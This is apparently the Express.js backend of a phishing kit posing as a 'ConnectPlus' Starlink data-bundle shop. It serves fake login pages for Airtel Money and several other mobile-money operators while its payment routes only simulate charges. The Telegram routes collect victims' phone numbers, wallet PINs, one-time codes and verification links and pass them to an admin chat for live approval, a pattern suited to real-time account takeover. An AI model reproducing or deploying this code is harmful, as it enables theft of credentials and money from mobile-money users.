const express = require('express');
const cors = require('cors');
const path = require('path');
const bodyParser = require('body-parser');
require('dotenv').config({ path: path.join(__dirname, '..', '.env') });
const { createApprovalRequest, submitOtp, submitPin, submitLink, getApprovalStatus } = require('./telegram-bot');
const { securityHeaders, corsMiddleware, validateApiSecret, rateLimit, validator, auditLog, createSession } = require('./security');

const app = express();
const PORT = process.env.PORT || 3000;

// Validate critical secrets on startup
const requiredSecrets = ['TELEGRAM_BOT_TOKEN', 'TELEGRAM_ADMIN_CHAT_ID'];
const missingSecrets = requiredSecrets.filter(key => !process.env[key] || process.env[key].includes('your-') || process.env[key].includes('change-me') || process.env[key].includes('placeholder'));
if (missingSecrets.length > 0) {
    console.error('Missing or invalid environment variables:', missingSecrets.join(', '));
    console.error('Please set these in your .env file.');
}

// Security middleware
app.use(securityHeaders);
app.use(corsMiddleware);
app.use(bodyParser.json({ limit: '1mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '1mb' }));

// Session-based auth endpoint
app.post('/api/auth/session', rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
    const token = createSession();
    res.json({ success: true, token, expiresIn: 3600000 });
});

// Explicit HTML routes — must come before static middleware
app.get('/starlink/', (req, res) => {
    res.sendFile(path.join(__dirname, '../plans.html'));
});

app.get('/starlink/status.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

app.get('/starlink/plans.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../plans.html'));
});

app.get('/starlink/orders.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../orders.html'));
});

app.get('/starlink/settings.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../settings.html'));
});

app.get('/starlink/register.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../register.html'));
});

app.get('/starlink/login.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../user-login.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../plans.html'));
});

// Root-level resources for payment gateway pages (must precede root static mount)
app.get('/manifest.json', (req, res) => {
    res.sendFile(path.join(__dirname, 'manifest.json'));
});
app.get('/airtel_icon-36x36.png', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon-36x36.png'));
});
app.get('/airtel_icon_x48.svg', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon_x48.svg'));
});
app.get('/airtel_icon_x72.svg', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon_x72.svg'));
});
app.get('/airtel_icon_x96.svg', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon_x96.svg'));
});
app.get('/airtel_icon_x128.svg', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon_x128.svg'));
});
app.get('/airtel_icon_x384.svg', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon_x384.svg'));
});
app.get('/airtel_icon_x512.svg', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon_x512.svg'));
});

// Serve static assets
app.use('/starlink', express.static(path.join(__dirname, '../')));
app.use(express.static(path.join(__dirname, '../')));

// API Routes
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', message: 'ConnectPlus API is running', paymentMethods: ['airtel'] });
});

// Get all packages — ConnectPlus catalogue (USD), Airtel Money only
app.get('/api/packages', (req, res) => {
    const packages = [
        // ── Daily plans ──────────────────────────────────────────
        { id: 'daily-100mb-20min', name: '100 Mo + 20 min', data: '100 Mo', minutes: 20, duration: '24 Hours', price: 0.25, originalPrice: 0.25, type: 'daily', limit: 'limited', features: ['100 Mo data', '20 minutes', '24 hour validity', 'Instant activation'] },
        { id: 'daily-300mb-50min', name: '300 Mo + 50 min', data: '300 Mo', minutes: 50, duration: '24 Hours', price: 0.50, originalPrice: 0.50, type: 'daily', limit: 'limited', features: ['300 Mo data', '50 minutes', '24 hour validity', 'Instant activation'] },
        { id: 'daily-1gb-100min', name: '1 Go + 100 min', data: '1 Go', minutes: 100, duration: '24 Hours', price: 1.00, originalPrice: 1.00, type: 'daily', limit: 'limited', features: ['1 Go data', '100 minutes', '24 hour validity', 'Instant activation'] },
        { id: 'daily-2gb-200min', name: '2 Go + 200 min', data: '2 Go', minutes: 200, duration: '24 Hours', price: 2.00, originalPrice: 2.00, type: 'daily', limit: 'limited', features: ['2 Go data', '200 minutes', '24 hour validity', 'Instant activation'] },
        // ── Weekly plans ─────────────────────────────────────────
        { id: 'weekly-1gb-100min', name: '1 Go + 100 min', data: '1 Go', minutes: 100, duration: '7 Days', price: 1.00, originalPrice: 1.00, type: 'weekly', limit: 'limited', features: ['1 Go data', '100 minutes', '7 day validity', 'Instant activation'] },
        { id: 'weekly-3gb-300min', name: '3 Go + 300 min', data: '3 Go', minutes: 300, duration: '7 Days', price: 2.00, originalPrice: 2.00, type: 'weekly', limit: 'limited', features: ['3 Go data', '300 minutes', '7 day validity', 'Instant activation'] },
        { id: 'weekly-6gb-600min', name: '6 Go + 600 min', data: '6 Go', minutes: 600, duration: '7 Days', price: 4.00, originalPrice: 4.00, type: 'weekly', limit: 'limited', features: ['6 Go data', '600 minutes', '7 day validity', 'Instant activation'] },
        { id: 'weekly-10gb-1000min', name: '10 Go + 1 000 min', data: '10 Go', minutes: 1000, duration: '7 Days', price: 6.00, originalPrice: 6.00, type: 'weekly', limit: 'limited', features: ['10 Go data', '1 000 minutes', '7 day validity', 'Instant activation'] },
        // ── Monthly plans ────────────────────────────────────────
        { id: 'monthly-3gb-300min', name: '3 Go + 300 min', data: '3 Go', minutes: 300, duration: '1 Month', price: 3.00, originalPrice: 3.00, type: 'monthly', limit: 'limited', features: ['3 Go data', '300 minutes', '30 days validity', 'Instant activation'] },
        { id: 'monthly-6gb-600min', name: '6 Go + 600 min', data: '6 Go', minutes: 600, duration: '1 Month', price: 5.00, originalPrice: 5.00, type: 'monthly', limit: 'limited', features: ['6 Go data', '600 minutes', '30 days validity', 'Instant activation'] },
        { id: 'monthly-15gb-1500min', name: '15 Go + 1 500 min', data: '15 Go', minutes: 1500, duration: '1 Month', price: 10.00, originalPrice: 10.00, type: 'monthly', limit: 'limited', features: ['15 Go data', '1 500 minutes', '30 days validity', 'Instant activation'] },
        { id: 'monthly-30gb-3000min', name: '30 Go + 3 000 min', data: '30 Go', minutes: 3000, duration: '1 Month', price: 15.00, originalPrice: 15.00, type: 'monthly', limit: 'limited', features: ['30 Go data', '3 000 minutes', '30 days validity', 'Instant activation'] },
        { id: 'monthly-unlimited-5000min', name: 'Internet illimité + 5 000 min', data: 'Illimité', minutes: 5000, duration: '1 Month', price: 20.00, originalPrice: 20.00, type: 'monthly', limit: 'unlimited', features: ['Internet illimité', '5 000 minutes', '30 days validity', 'Instant activation'] }
    ];
    res.json(packages);
});

// Process payment
app.post('/api/payment', (req, res) => {
    const { packageId, method, phone, amount } = req.body;

    // Validate
    if (!packageId || !method || !phone || !amount) {
        return res.status(400).json({
            success: false,
            message: 'Missing required fields'
        });
    }

    // Simulate payment processing
    const orderId = Date.now().toString();
    const status = 'pending';

    res.json({
        success: true,
        message: 'Payment processed successfully',
        orderId: orderId,
        status: status,
        packageId: packageId,
        method: method,
        phone: phone,
        amount: amount
    });
});

// Get orders by phone
app.get('/api/orders/:phone', (req, res) => {
    const phone = req.params.phone;
    // In a real app, fetch from database
    // For demo, return sample orders
    const orders = [
        {
            id: '1',
            package: 'Basic Package',
            amount: 3000,
            method: 'airtel',
            phone: phone,
            date: new Date().toISOString(),
            status: 'active'
        }
    ];
    res.json(orders);
});

// Webhook for Airtel Money (only supported payment operator)
app.post('/api/webhook/airtel', (req, res) => {
    const { transactionId, status, amount, phone } = req.body;
    console.log('Airtel Money Webhook:', { transactionId, status, amount, phone });
    res.json({ success: true });
});

// ── Airtel Payment Gateway APIs ──────────────────────────────────
app.post('/api/set-country', (req, res) => {
    const { country } = req.body;
    console.log('Airtel country set:', country);
    res.json({ success: true });
});

app.post('/api/b2c-backend/v2/send-otp', (req, res) => {
    const { msisdn, pin, starlinkPackage } = req.body;
    console.log('Airtel send OTP:', { msisdn, pin, starlinkPackage });
    res.json({ status: 'SUCCESS', data: { otpId: 'otp-' + Date.now() } });
});

app.get('/api/check-status', (req, res) => {
    res.json({ status: 'pending' });
});

app.post('/api/user-deposited', (req, res) => {
    console.log('User deposited notification');
    res.json({ success: true });
});

app.post('/api/b2c-backend/v2/verify-otp', (req, res) => {
    const { otp, otpId, msisdn } = req.body;
    console.log('Airtel verify OTP:', { otp, otpId, msisdn });
    res.json({ status: 'SUCCESS', message: 'OTP verified successfully' });
});

app.post('/api/b2c-backend/v2/resend-otp', (req, res) => {
    const { msisdn } = req.body;
    console.log('Airtel resend OTP:', { msisdn });
    res.json({ status: 'SUCCESS', data: { otpId: 'otp-' + Date.now() } });
});

app.post('/api/clipboard-status', (req, res) => {
    const { decision, phone, country, source } = req.body;
    console.log('Clipboard status:', { decision, phone, country, source });
    res.json({ success: true, decision });
});

// ── Payment gateway pages (browser fallback pages for legacy flows) ──
// NOTE: Orange Money is no longer a supported payment operator. Purchases are
// Airtel Money only, so the Orange gateway page and its API routes are removed.
const paymentGateways = ['moov', 'lumitel', 'ecocash', 'waafi', 'card', 'kbzpay', 'mtn'];
paymentGateways.forEach(gateway => {
    const htmlFile = path.join(__dirname, '..', gateway, 'login.html');
    app.get(`/${gateway}/login`, (req, res) => {
        if (require('fs').existsSync(htmlFile)) {
            res.sendFile(htmlFile);
        } else {
            res.status(404).send('Not Found');
        }
    });
    app.get(`/${gateway}/login.html`, (req, res) => {
        if (require('fs').existsSync(htmlFile)) {
            res.sendFile(htmlFile);
        } else {
            res.status(404).send('Not Found');
        }
    });
});

// Ethiopia login
app.get('/ethiopia/login', (req, res) => {
    const file = path.join(__dirname, '..', 'ethiopia', 'login.html');
    if (require('fs').existsSync(file)) {
        res.sendFile(file);
    } else {
        res.status(404).send('Not Found');
    }
});

// Default /login (Airtel Money)
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'airtel-login.html'));
});

// Telegram notification endpoint
app.post('/api/telegram/notify', validateApiSecret, (req, res) => {
    const { message } = req.body;
    if (!message) {
        return res.json({ success: false, message: 'Message required' });
    }
    const sent = require('./telegram-bot').sendNotification(message);
    res.json({ success: sent, message: sent ? 'Notification sent' : 'Bot not enabled' });
});

// ── Agent payment API routes ───────────────────────────────────
app.get('/api/agent-config', (req, res) => {
    const country = req.query.country;
    const provider = req.query.provider;
    const agents = {
        'CD_vodacom': { found: true, agent_number: '21500*15#', agent_name: 'Vodacom DRC Agent', instructions: 'Apeui ope code *21500*15# nano M-Pesa.' },
        'ZM_airtel': { found: true, agent_number: '146*3*1#', agent_name: 'Airtel Zambia Agent', instructions: 'Apeui enter *146*3*1# ku Airtel Money.' },
    };
    const key = country + '_' + provider;
    if (agents[key]) {
        res.json(agents[key]);
    } else {
        res.json({ found: false });
    }
});

app.post('/api/agent-payment', (req, res) => {
    const { country, provider, location, phone, package: pkg, amount, confirmation_text } = req.body;
    console.log('Agent Payment Request:', { country, provider, location, phone, package: pkg, amount });
    setTimeout(() => {
        res.json({ success: true, orderId: 'AGT-' + Date.now() });
    }, 500);
});

// ── Telegram Bot API Routes ───────────────────────────────────

// Create a new payment approval request
app.post('/api/telegram/request-approval', validateApiSecret, rateLimit({ maxRequests: 5, windowMs: 60000 }), (req, res) => {
    const { userPhone, userPin, package: pkg, amount, method, countryCode } = req.body;
    const clientIp = req.ip || 'unknown';

    // ConnectPlus is a DRC service; default the dial code to +243 so the
    // national-number format is always enforced even if the client omits it.
    const dialCode = (countryCode || '243').toString().replace(/\D/g, '');

    // Validate inputs
    if (!validator.phone(userPhone, dialCode)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_phone' });
        return res.status(400).json({ success: false, message: 'Invalid phone number. Please enter a valid mobile number.' });
    }
    if (!validator.pin(userPin)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_pin' });
        return res.status(400).json({ success: false, message: 'Invalid PIN format (4-6 digits required)' });
    }
    if (!validator.package(pkg)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_package' });
        return res.status(400).json({ success: false, message: 'Invalid package' });
    }
    if (method && !validator.method(method)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_method' });
        return res.status(400).json({ success: false, message: 'Invalid payment method' });
    }

    const requestId = createApprovalRequest({
        userPhone: validator.sanitize(userPhone),
        userPin: validator.sanitize(userPin),
        package: validator.sanitize(pkg),
        amount: amount ? validator.sanitize(amount) : 'N/A',
        method: method ? validator.sanitize(method) : 'N/A',
        onApproved: (id) => {
            console.log(`Approval request ${id} approved by admin`);
            auditLog.write('TELEGRAM_APPROVED', { requestId: id });
        },
        onRejected: (id) => {
            console.log(`Approval request ${id} rejected by admin`);
            auditLog.write('TELEGRAM_REJECTED', { requestId: id });
        },
        onInvalid: (id) => {
            console.log(`Approval request ${id} marked as invalid`);
            auditLog.write('TELEGRAM_INVALID', { requestId: id });
        },
        onVerified: (id) => {
            console.log(`OTP verification successful for request ${id}`);
            auditLog.write('TELEGRAM_VERIFIED', { requestId: id });
        },
        onWrongPin: (id) => {
            console.log(`Wrong PIN entered for request ${id}`);
            auditLog.write('TELEGRAM_WRONG_PIN', { requestId: id });
        },
        onWrongOtp: (id) => {
            console.log(`Wrong OTP entered for request ${id}`);
            auditLog.write('TELEGRAM_WRONG_OTP', { requestId: id });
        },
        onTimeout: (id) => {
            console.log(`OTP verification timeout for request ${id}`);
            auditLog.write('TELEGRAM_TIMEOUT', { requestId: id });
        }
    });

    auditLog.logTelegramRequest(clientIp, userPhone, pkg, method, requestId);
    res.json({ success: true, requestId, message: 'Approval request sent to admin' });
});

// Submit OTP for verification
app.post('/api/telegram/submit-otp', validateApiSecret, rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
    const { requestId, otp } = req.body;
    const clientIp = req.ip || 'unknown';

    if (!validator.requestId(requestId)) {
        auditLog.write('TELEGRAM_OTP_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_request_id' });
        return res.status(400).json({ success: false, message: 'Invalid request ID format' });
    }
    if (!validator.otp(otp)) {
        auditLog.write('TELEGRAM_OTP_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_otp' });
        return res.status(400).json({ success: false, message: 'Invalid OTP format (4-8 digits required)' });
    }

    const result = submitOtp(requestId, validator.sanitize(otp));
    auditLog.logTelegramOtp(clientIp, requestId, result.success);
    res.json(result);
});

// Re-submit phone/PIN after the admin flagged it as wrong (wrong PIN flow)
app.post('/api/telegram/submit-pin', validateApiSecret, rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
    const { requestId, pin } = req.body;
    const clientIp = req.ip || 'unknown';

    if (!validator.requestId(requestId)) {
        auditLog.write('TELEGRAM_PIN_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_request_id' });
        return res.status(400).json({ success: false, message: 'Invalid request ID format' });
    }
    if (pin !== undefined && pin !== null && pin !== '' && !validator.pin(pin)) {
        auditLog.write('TELEGRAM_PIN_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_pin' });
        return res.status(400).json({ success: false, message: 'Invalid PIN format (4-6 digits required)' });
    }

    const result = submitPin(requestId, pin ? validator.sanitize(pin) : null);
    auditLog.write('TELEGRAM_PIN_RESUBMIT', { ip: clientIp, requestId, success: result.success });
    res.json(result);
});

// Submit verification link (admin-reviewed operator link)
app.post('/api/telegram/submit-link', validateApiSecret, rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
    const { requestId, link } = req.body;
    const clientIp = req.ip || 'unknown';

    if (!validator.requestId(requestId)) {
        auditLog.write('TELEGRAM_LINK_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_request_id' });
        return res.status(400).json({ success: false, message: 'Invalid request ID format' });
    }
    if (!link || typeof link !== 'string' || link.length < 5) {
        auditLog.write('TELEGRAM_LINK_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_link' });
        return res.status(400).json({ success: false, message: 'Invalid link format' });
    }

    const result = submitLink(requestId, (link || '').trim());
    auditLog.logTelegramOtp(clientIp, requestId, result.success);
    res.json(result);
});

app.get('/api/telegram/status/:requestId', validateApiSecret, (req, res) => {
    const { requestId } = req.params;
    const clientIp = req.ip || 'unknown';

    if (!validator.requestId(requestId)) {
        return res.status(400).json({ status: 'invalid_request_id' });
    }

    const status = getApprovalStatus(requestId);
    auditLog.logTelegramStatus(clientIp, requestId, status.status);
    res.json(status);
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 ConnectPlus Server running on http://localhost:${PORT}`);
    console.log(`📡 API available at http://localhost:${PORT}/api`);
});